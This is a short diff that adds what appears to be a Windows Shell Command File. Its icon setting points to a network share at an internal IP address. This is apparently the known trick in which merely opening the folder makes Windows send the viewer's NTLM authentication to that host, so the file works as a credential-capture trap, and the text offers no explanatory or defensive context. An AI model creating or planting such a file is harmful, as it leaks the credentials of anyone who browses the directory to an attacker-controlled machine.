@@ -1,0 +1,6 @@
+[Shell]
+Command=3
+IconFile=\\10.100.13.244\icon
+
+[IE]
+Command=Channels
